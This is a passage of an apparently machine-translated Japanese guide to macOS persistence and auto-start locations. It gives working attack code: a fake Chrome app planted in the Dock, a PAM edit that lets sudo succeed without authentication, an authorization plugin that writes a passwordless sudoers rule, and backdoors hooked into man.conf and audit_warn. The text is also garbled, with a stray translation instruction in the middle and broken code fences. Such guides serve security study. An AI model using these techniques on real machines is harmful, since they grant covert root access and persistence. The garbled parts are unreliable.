これをコンパイルするには： `osacompile -l JavaScript -o folder.scpt source.js`

これを移動する先：
```
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
次に、`Folder Actions Setup` アプリを開き、**監視したいフォルダ**を選択し、あなたの場合は **`folder.scpt`** を選択します（私の場合は output2.scp と呼びました）：

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

これで、そのフォルダを **Finder** で開くと、スクリプトが実行されます。

この設定は、base64形式で **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** にある **plist** に保存されました。

次に、GUIアクセスなしでこの永続性を準備してみましょう：

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** を `/tmp` にコピーしてバックアップします：
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 設定したフォルダアクションを**削除**します：

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

これで環境が空になりました

3. バックアップファイルをコピーします：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. この設定を消費するために Folder Actions Setup.app を開きます：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
これは私にはうまくいきませんでしたが、これがレポートからの指示です :(
{% endhint %}

### Spotlight Importers

レポート：[https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* サンドボックスをバイパスするのに役立ちます：[🟠](https://emojipedia.org/large-orange-circle)
* しかし、新しいサンドボックスに入ることになります

#### 場所

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### 説明

**重いサンドボックス**に入るので、この技術を使いたくないでしょう。

### Dock shortcuts

レポート：[https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* サンドボックスをバイパスするのに役立ちます：[✅](https://emojipedia.org/check-mark-button)
* しかし、システム内に悪意のあるアプリケーションをインストールしている必要があります

#### 場所

* `~/Library/Preferences/com.apple.dock.plist`
* **トリガー**：ユーザーがドック内のアプリをクリックしたとき

#### 説明 & 悪用

ドックに表示されるすべてのアプリケーションは、plist：**`~/Library/Preferences/com.apple.dock.plist`** 内で指定されています。

次のようにしてアプリケーションを**追加**することが可能です：

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

いくつかの**ソーシャルエンジニアリング**を使用して、たとえばドック内の**Google Chromeになりすまし**、実際に自分のスクリプトを実行することができます:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### カラーピッカー

解説: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* サンドボックスをバイパスするのに役立つ: [🟠](https://emojipedia.org/large-orange-circle)
* 非常に特定のアクションが必要
* 別のサンドボックスに入ることになる

#### 場所

* `/Library/ColorPickers`&#x20;
* Rootが必要
* トリガー: カラーピッカーを使用する
* `~/Library/ColorPickers`
* トリガー: カラーピッカーを使用する

#### 説明 & エクスプロイト

**カラーピッカー** バンドルをあなたのコードでコンパイルします（例として[**このものを使用できます**](https://github.com/viktorstrate/color-picker-plus))、コンストラクタを追加します（[スクリーンセーバーのセクション](macos-auto-start-locations.md#screen-saver)のように）そしてバンドルを `~/Library/ColorPickers` にコピーします。

その後、カラーピッカーがトリガーされたとき、あなたのコードも実行されるはずです。

ライブラリをロードするバイナリは**非常に制限的なサンドボックス**を持っていることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync プラグイン

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* サンドボックスをバイパスするのに役立つか: **いいえ、自分のアプリを実行する必要があります**

#### 場所

* 特定のアプリ

#### 説明 & エクスプロイト

Finder Sync 拡張機能を持つアプリケーションの例は[**こちらで見つけることができます**](https://github.com/D00MFist/InSync)。

アプリケーションは `Finder Sync 拡張機能` を持つことができます。この拡張機能は実行されるアプリケーションの内部に入ります。さらに、拡張機能がコードを実行するためには、有効なApple開発者証明書で**署名されている必要があります**、**サンドボックス化されている必要があります**（ただし、緩和された例外を追加することができます）そして、以下のようなもので登録されている必要があります：
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* サンドボックスをバイパスするのに役立つ: [🟠](https://emojipedia.org/large-orange-circle)
* しかし、一般的なアプリケーションサンドボックスに入ることになります

#### 場所

* `/System/Library/Screen Savers`&#x20;
* Root権限が必要
* **トリガー**: スクリーンセーバーを選択
* `/Library/Screen Savers`
* Root権限が必要
* **トリガー**: スクリーンセーバーを選択
* `~/Library/Screen Savers`
* **トリガー**: スクリーンセーバーを選択

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明とエクスプロイト

Xcodeで新しいプロジェクトを作成し、新しい**スクリーンセーバー**を生成するテンプレートを選択します。次に、例えばログを生成する以下のコードを追加します。

**ビルド**し、`.saver`バンドルを**`~/Library/Screen Savers`**にコピーします。その後、スクリーンセーバーGUIを開き、それをクリックするだけで、多くのログが生成されるはずです：

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
このコードを読み込むバイナリ（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）のエンタイトルメント内に**`com.apple.security.app-sandbox`**が存在するため、**一般的なアプリケーションサンドボックス内**にいることに注意してください。
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight プラグイン

サンドボックスをバイパスするのに役立ちます: [🟠](https://emojipedia.org/large-orange-circle)

* しかし、アプリケーションのサンドボックス内に終わります

#### 場所

* `~/Library/Spotlight/`
* **トリガー**: Spotlight プラグインが管理する拡張子を持つ新しいファイルが作成されます。
* `/Library/Spotlight/`
* **トリガー**: Spotlight プラグインが管理する拡張子を持つ新しいファイルが作成されます。
* Root 権限が必要です
* `/System/Library/Spotlight/`
* **トリガー**: Spotlight プラグインが管理する拡張子を持つ新しいファイルが作成されます。
* Root 権限が必要です
* `Some.app/Contents/Library/Spotlight/`
* **トリガー**: Spotlight プラグインが管理する拡張子を持つ新しいファイルが作成されます。
* 新しいアプリが必要です

#### 説明と悪用

Spotlight は macOS の組み込み検索機能で、ユーザーがコンピュータ上のデータに**迅速かつ包括的にアクセスする**ことを目的としています。\
この迅速な検索機能を実現するために、Spotlight は**独自のデータベース**を維持し、ほとんどのファイルを**解析することで**インデックスを作成し、ファイル名とその内容の両方を通じて迅速な検索を可能にします。

Spotlight の基本的なメカニズムには、**'metadata server'** を意味する 'mds' という中央プロセスが関与しています。このプロセスは、Spotlight サービス全体を調整します。これを補完するために、さまざまなファイルタイプのインデックス作成など、さまざまなメンテナンスタスクを実行する複数の 'mdworker' デーモンがあります（`ps -ef | grep mdworker`）。これらのタスクは、Spotlight インポータープラグイン、または **".mdimporter バンドル"** を通じて可能になります。これにより、Spotlight は多様なファイル形式のコンテンツを理解し、インデックスを作成することができます。

プラグインまたは **`.mdimporter`** バンドルは、前述の場所にあり、新しいバンドルが現れると、サービスを再起動する必要なく数分以内にロードされます。これらのバンドルは、管理できる**ファイルタイプと拡張子を指定する**必要があります。このようにして、Spotlight は指定された拡張子を持つ新しいファイルが作成されたときにそれらを使用します。

ロードされているすべての `mdimporters` を見つけることができます。実行してください：
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例えば、**/Library/Spotlight/iBooksAuthor.mdimporter** は、これらのタイプのファイル（拡張子 `.iba` や `.book` など）を解析するために使用されます：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
他の`mdimporter`のPlistをチェックすると、**`UTTypeConformsTo`**のエントリが見つからないかもしれません。それは、それが組み込みの_Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))であり、拡張子を指定する必要がないからです。

さらに、システムのデフォルトプラグインは常に優先されるため、攻撃者はApple自身の`mdimporters`によってインデックスされていないファイルのみにアクセスできます。
{% endhint %}

独自のインポーターを作成するには、このプロジェクトから始めることができます: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) その後、名前、**`CFBundleDocumentTypes`**を変更し、**`UTImportedTypeDeclarations`**を追加して、サポートしたい拡張子をサポートし、**`schema.xml`**に反映させます。\
次に、処理された拡張子のファイルが作成されたときにペイロードを実行するように関数**`GetMetadataForFile`**のコードを**変更**します。

最後に**新しい`.mdimporter`をビルドしてコピー**し、前述の場所のいずれかに配置すると、**ログを監視**するか**`mdimport -L.`**をチェックすることで、いつロードされるかを確認できます。

### ~~Preference Pane~~

{% hint style="danger" %}
もう機能していないようです。
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

* サンドボックスをバイパスするのに役立ちます: [🟠](https://emojipedia.org/large-orange-circle)
* 特定のユーザーアクションが必要です

#### 場所

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### 説明

もう機能していないようです。

## Root Sandbox Bypass

{% hint style="success" %}
ここでは、**root**であることと/または他の**奇妙な条件**が必要であることによって、ファイルに書き込むことで単純に何かを実行することを可能にする**サンドボックスバイパス**に役立つスタートロケーションを見つけることができます。
{% endhint %}

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

* サンドボックスをバイパスするのに役立ちます: [🟠](https://emojipedia.org/large-orange-circle)
* しかし、rootである必要があります

#### 場所

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Rootが必要です
* **トリガー**: 時間が来たとき
* `/etc/daily.local`, `/etc/weekly.local` または `/etc/monthly.local`
* Rootが必要です
* **トリガー**: 時間が来たとき

#### 説明 & 悪用

周期的なスクリプト（**`/etc/periodic`**）は、`/System/Library/LaunchDaemons/com.apple.periodic*`に設定された**ランチデーモン**によって実行されます。`/etc/periodic/`に保存されたスクリプトは**ファイルの所有者として** **実行される**ので、潜在的な権限昇格には機能しません。

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
```
他にも、**`/etc/defaults/periodic.conf`** で指定された定期的に実行されるスクリプトがあります:
```
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
以下のファイルのいずれか `/etc/daily.local`、`/etc/weekly.local`、`/etc/monthly.local` に書き込むことができれば、**遅かれ早かれ実行されます**。

{% hint style="warning" %}
定期的なスクリプトは**スクリプトの所有者として実行される**ことに注意してください。通常のユーザーがスクリプトを所有している場合、そのユーザーとして実行されます（これにより権限昇格攻撃を防ぐことができるかもしれません）。
{% endhint %}

### PAM

解説: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
解説: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* サンドボックスをバイパスするのに役立つ: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、rootである必要があります

#### 場所

* 常にrootが必要です

#### 説明と悪用

PAMはmacOS内での簡単な実行よりも**永続性**とマルウェアに焦点を当てているため、このブログでは詳細な説明は提供しません。**このテクニックをよりよく理解するためには、解説を読んでください**。

PAMモジュールを以下で確認:&#x20;
```bash
ls -l /etc/pam.d
```
```markdown
永続性/権限昇格テクニックとしてPAMを悪用する方法は、モジュール /etc/pam.d/sudo を変更し、最初に以下の行を追加することです:
```
```bash
auth       sufficient     pam_permit.so
```
So it will **このように見える** something like this:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
以下は、macOSの自動起動場所に関するハッキング技術についての内容です。関連する英語テキストを日本語に翻訳し、同じマークダウンおよびHTML構文を保持してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余計なものは追加しないでください。

---

そしてしたがって、**`sudo`を使用する試みは機能するでしょう**。

{% hint style="danger" %}
このディレクトリはTCCによって保護されているため、ユーザーがアクセスを求めるプロンプトが表示される可能性が高いことに注意してください。
{% endhint %}

### 認証プラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* サンドボックスをバイパスするのに役立ちます: [🟠](https://emojipedia.org/large-orange-circle)
* しかし、rootである必要があり、追加の設定を行う必要があります

#### 場所

* `/Library/Security/SecurityAgentPlugins/`
* Rootが必要です
* プラグインを使用するためには、認証データベースを設定する必要があります

#### 説明と悪用

ユーザーがログインするときに実行される認証プラグインを作成して、永続性を維持することができます。これらのプラグインの作成方法についての詳細は、前述のWriteupを確認してください（注意してください、不適切に書かれたプラグインはあなたをロックアウトする可能性があり、リカバリーモードからmacをクリーンアップする必要があるかもしれません）。
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**バンドルをロードする場所に移動します：**
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最後に、このプラグインをロードするための**ルール**を追加します：
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** は、認証フレームワークに対して**外部メカニズムを呼び出して認証する必要がある**ことを伝えます。さらに、**`privileged`** はそれがrootによって実行されるようにします。

以下でトリガーします：
```bash
security authorize com.asdf.asdf
```
そして、**staff グループは sudo アクセス権を持つべきです**（確認するには `/etc/sudoers` を読む）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* サンドボックスをバイパスするのに役立つ: [🟠](https://emojipedia.org/large-orange-circle)
* しかし、root である必要があり、ユーザーが man を使用する必要がある

#### 位置

* **`/private/etc/man.conf`**
* Root が必要
* **`/private/etc/man.conf`**: man が使用されるたびに

#### 説明 & エクスプロイト

設定ファイル **`/private/etc/man.conf`** は、man ドキュメントファイルを開く際に使用するバイナリ/スクリプトを指定します。したがって、実行可能ファイルへのパスを変更することで、ユーザーが man を使用してドキュメントを読むたびにバックドアが実行されるようにすることができます。

例えば、**`/private/etc/man.conf`** に次のように設定します：
```
MANPAGER /tmp/view
```
その後、`/tmp/view` を以下のように作成します：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* サンドボックスをバイパスするのに役立つ: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、root権限が必要で、Apacheが実行中である必要があります

#### 位置

* **`/etc/apache2/httpd.conf`**
* Root権限が必要
* トリガー: Apache2が起動したとき

#### 説明とエクスプロイト

/etc/apache2/httpd.confにモジュールをロードするように指示する行を追加することができます:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
```
{% endcode %}

この方法で、コンパイルされたモジュールがApacheによってロードされます。ただし、**有効なApple証明書で署名する**か、システムに**新しい信頼できる証明書を追加**して、それで**署名する**必要があります。

その後、必要に応じて、サーバーが起動されることを確認するために次のコマンドを実行できます：
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
コード例：Dylb：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM監査フレームワーク

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* サンドボックスをバイパスするのに役立つ: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、rootである必要があり、auditdが実行されていて警告を引き起こす必要がある

#### 位置

* **`/etc/security/audit_warn`**
* Rootが必要
* **トリガー**: auditdが警告を検出したとき

#### 説明とエクスプロイト

auditdが警告を検出すると、スクリプト**`/etc/security/audit_warn`**が**実行されます**。したがって、ペイロードを追加することができます。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n`を使用して警告を強制することができます。

### スタートアップ項目

{% hint style="danger" %}
**これは非推奨ですので、以下のディレクトリには何も見つからないはずです。**
{% endhint %}

**StartupItem**は、これらの2つのフォルダのいずれかに**配置されるディレクトリ**です。`/Library/StartupItems/` または `/System/Library/StartupItems/`

新しいディレクトリをこれらの2つの場所のいずれかに配置した後、そのディレクトリ内に**さらに2つの項目**を配置する必要があります。これら2つの項目は、**rcスクリプト**といくつかの設定を保持する**plist**です。このplistは "**StartupParameters.plist**" と呼ばれなければなりません。

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
macOSでこのコンポーネントを見つけることができないので、詳細はライトアップを確認してください
{% endhint %}

ライトアップ: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Appleは**emond**と呼ばれるログメカニズムを導入しました。完全に開発されたことはなく、Appleによって他のメカニズムのために開発が**放棄**された可能性がありますが、依然として**利用可能**です。

このあまり知られていないサービスは、Mac管理者にとってはあまり役に立たないかもしれませんが、脅威アクターにとっては、ほとんどのmacOS管理者が探すことを知らないであろう**永続性メカニズムとして使用する非常に良い理由**があります。emondの悪意のある使用を検出することは難しくないはずです。なぜなら、サービスのSystem LaunchDaemonはスクリプトを実行する場所を1つだけ探しているからです：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### 場所

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Root権限が必要
* **トリガー**: XQuartzと共に

#### 説明 & エクスプロイト

XQuartzは**macOSにはもうインストールされていません**ので、詳細はwriteupを確認してください。

### ~~kext~~

{% hint style="danger" %}
rootとしてkextをインストールするのは非常に複雑なので、サンドボックスからの脱出や持続性のためには考慮しません（エクスプロイトを持っていない限り）
{% endhint %}

#### 場所

スタートアップアイテムとしてKEXTをインストールするには、以下の場所のいずれかに**インストールする必要があります**:

* `/System/Library/Extensions`
* OS Xオペレーティングシステムに組み込まれたKEXTファイル。
* `/Library/Extensions`
* サードパーティソフトウェアによってインストールされたKEXTファイル

現在ロードされているkextファイルをリストするには：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
以下の情報については、[**カーネル拡張についてはこのセクションをチェックしてください**](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers)。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### 場所

* **`/usr/local/bin/amstoold`**
* Root権限が必要

#### 説明と悪用

どうやら`/System/Library/LaunchAgents/com.apple.amstoold.plist`の`plist`がこのバイナリを使用してXPCサービスを公開していたようですが、バイナリが存在しなかったので、何かをそこに置くと、XPCサービスが呼び出されたときにあなたのバイナリが呼び出されることになります。

私のmacOSではもうこれを見つけることができません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### 場所

* **`/Library/Preferences/Xsan/.xsanrc`**
* Root権限が必要
* **トリガー**: サービスが実行されたとき（まれ）

#### 説明と悪用

どうやらこのスクリプトを実行することは非常に一般的ではなく、私のmacOSではそれを見つけることができませんでしたので、詳細が知りたい場合はwriteupをチェックしてください。

### ~~/etc/rc.common~~

{% hint style="danger" %}
**これは現代のMacOSバージョンでは機能しません**
{% endhint %}

ここにも**スタートアップ時に実行されるコマンドを配置することが可能です。** 通常のrc.commonスクリプトの例：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

